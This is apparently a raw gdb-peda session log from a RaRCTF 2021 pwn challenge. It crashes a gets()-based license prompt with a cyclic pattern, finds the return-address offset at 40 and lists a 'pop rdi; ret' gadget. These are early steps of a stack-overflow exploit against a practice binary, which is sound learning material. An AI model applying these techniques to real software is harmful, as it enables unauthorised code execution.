gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x00401000         r--p	/home/mito/CTF/RaRCTF_2021/Pwn_ret2winRaRs_150/ret2winrars
0x00401000         0x00402000         r-xp	/home/mito/CTF/RaRCTF_2021/Pwn_ret2winRaRs_150/ret2winrars
0x00402000         0x00403000         r--p	/home/mito/CTF/RaRCTF_2021/Pwn_ret2winRaRs_150/ret2winrars
0x00403000         0x00404000         r--p	/home/mito/CTF/RaRCTF_2021/Pwn_ret2winRaRs_150/ret2winrars
0x00404000         0x00405000         rw-p	/home/mito/CTF/RaRCTF_2021/Pwn_ret2winRaRs_150/ret2winrars
0x00405000         0x00426000         rw-p	[heap]
0x00007ffff79e2000 0x00007ffff7bc9000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bc9000 0x00007ffff7dc9000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dc9000 0x00007ffff7dcd000 r--p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcd000 0x00007ffff7dcf000 rw-p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd3000 rw-p	mapped
0x00007ffff7dd3000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7fd5000 0x00007ffff7fd7000 rw-p	mapped
0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]


gdb-peda$ run
Starting program: /home/mito/CTF/RaRCTF_2021/Pwn_ret2winRaRs_150/ret2winrars 
Hello, welcome to the WinRaRs!
Please enter your WinRaR license key to get access: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdda0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
RBX: 0x0 
RCX: 0x7ffff7dcda00 --> 0xfbad2288 
RDX: 0x7ffff7dcf8d0 --> 0x0 
RSI: 0x405261 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAA"...)
RDI: 0x7fffffffdda1 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAA"...)
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffddc8 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%"...)
RIP: 0x401190 (<get_license+27>:	ret)
R8 : 0x405361 --> 0x0 
R9 : 0x7ffff7fd64c0 (0x00007ffff7fd64c0)
R10: 0x405010 --> 0x0 
R11: 0x246 
R12: 0x401080 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdeb0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401189 <get_license+20>:	call   0x401060 <gets@plt>
   0x40118e <get_license+25>:	nop
   0x40118f <get_license+26>:	leave  
=> 0x401190 <get_license+27>:	ret    
   0x401191 <main>:	push   rbp
   0x401192 <main+1>:	mov    rbp,rsp
   0x401195 <main+4>:	mov    rax,QWORD PTR [rip+0x2eb4]        # 0x404050 <stdout@@GLIBC_2.2.5>
   0x40119c <main+11>:	mov    ecx,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddc8 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%"...)
0008| 0x7fffffffddd0 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA"...)
0016| 0x7fffffffddd8 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0024| 0x7fffffffdde0 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0032| 0x7fffffffdde8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0040| 0x7fffffffddf0 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0048| 0x7fffffffddf8 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0056| 0x7fffffffde00 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000401190 in get_license ()
gdb-peda$ patto AA0A
AA0A found at offset: 40
gdb-peda$ 


0x000000000040124b: pop rdi; ret; 
